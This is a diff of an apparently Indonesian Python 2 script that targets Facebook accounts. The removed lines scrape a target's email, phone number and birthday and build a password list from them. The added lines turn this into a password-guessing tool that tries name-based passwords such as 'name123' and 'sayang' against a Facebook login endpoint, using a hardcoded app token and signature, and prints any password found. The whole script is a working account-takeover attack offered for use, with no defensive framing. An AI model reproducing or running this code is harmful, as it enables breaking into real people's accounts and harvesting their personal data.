@@ -1,93 +1,70 @@
 import os
 import sys
 import time
-import urllib
 import json
+import urllib
 import requests
 
-
 def login():
+    
     try:
         token = open("token.txt", "r")
-        informasi()
-        
+    
     except IOError:
-        print " Login Dulu Bos..."
-        user = raw_input(" Masukkan Username: ")
-        password = raw_input(" Masukkan Password: ")
+        print " Login FB...."
+        user = raw_input(" Username: ")
+        password = raw_input(" Password: ")
         url = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
         dev = url.content
         jsl = json.loads(dev)
         if "session_key" in dev:
-            print " Login Sukses.."
+            print " Login Sukses...."
             open("token.txt", "w").write(jsl["access_token"])
-            informasi()
-        
+            brute()
         elif "www.facebook.com" in jsl["error_msg"]:
-            print " Akun Kena Cekpoint.."
-            os.system("rm -rf token.txt")
+            print " Akun Kena Cekpoint"
+            os.system("rm -f token.txt")
+            sys.exit()
+
         else:
-            print " Gagal Login.."
-            
-    except KeyboardInterrupt:
-        sys.exit()
-        
-def informasi():
+            print " Gagal Login..."
+
+def brute():
     try:
         token = open("token.txt", "r").read()
+
     except IOError:
-        print " Tidak Ada Token ..."
-    else:
-        try:
-            target = raw_input(" Masukkan ID Target: ")
-            url = requests.get("https://graph.facebook.com/" + target + "?access_token=" + token)
-            dev = json.loads(url.text)
-            try:
-                print " Mama: " + dev['name']
-            except KeyError:
-                print " Nama Tidak Ada"
-           
-            try:
-                print " Email : " + dev['email']
-            except KeyError:
-                print " Emai Tidak Ada"
-                
-            try:
-                print " No HP: " + dev["mobile_phone"]
-            except KeyError:
-                print " NO hp Tidak Ada"
-                   
-            try:
-                print " Tanggal Lahir: " + dev["birthday"]
-            except KeyError:
-                print " Tanggal Tidak Ada"
         
-        except KeyboardInterrupt:
-            sys.exit()
-    word()
-    
-def word():
-    try:
-        token = open("token.txt", "r").read()
-    except IOError:
-        print " Tidak Ada Token ..."
-    else:
-        try:
-            target = raw_input(" Masukkan ID Target: ")
-            url = requests.get("https://graph.facebook.com/" + target + "?access_token=" + token)
-            dev = json.loads(url.text)
-            nama1 = dev["first_name"] + "123\n"
-            nama2 = dev["last_name"] + "123\n"
-            nama3 = dev["first_name"] + "12345\n"
-            nama4 = dev["last_name"] + "12345\n"
-            birth = dev["birthday"]
-            tgl = birth.replace("/", "")  
-            print nama1 + nama2 + nama3 + tgl     
-        except KeyboardInterrupt:
-            sys.exit()
+        target = raw_input(" Masukkan ID Target: ")
+        iqbal = requests.get("https://graph.facebook.com/" + target + "?access_token=" + token)
+        jsl = json.loads(iqbal.text)
+        sandi1 = jsl["first_name"] + "123"
+        log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+        js = json.load(log)
+        if "access_token" in js:
+            print " User ID: " + target
+            print " Password Found: " + sandi1
+        elif "www.facebook.com" in jsl["error_msg"]:
+            print " akun Cekpoint." + sandi1
+        
+        else:
+            sandi2 = jsl["first_name"] + "12345" 
+            log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+            js = json.load(log)
+            if "access_token" in js:
+                print " Password Found: " + sandi2
+            elif "www.facebook.com" in js["error_msg"]:
+                print " Akun Cekpoint" + sandi2
+            else:
+                sandi3 = "sayang" 
+                log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                js = json.load(log)
+                if "access_token" in js:
+                    print " Password Found: " + sandi3
+                elif "www.facebook.com" in js["error_msg"]:
+                    print " Akun Cekpoint" + sandi3
+                else:
+                    print " Gagagagagagall........"
 
-def main():
-    login()
 
-if __name__=="__main__":
-    main()
+login()
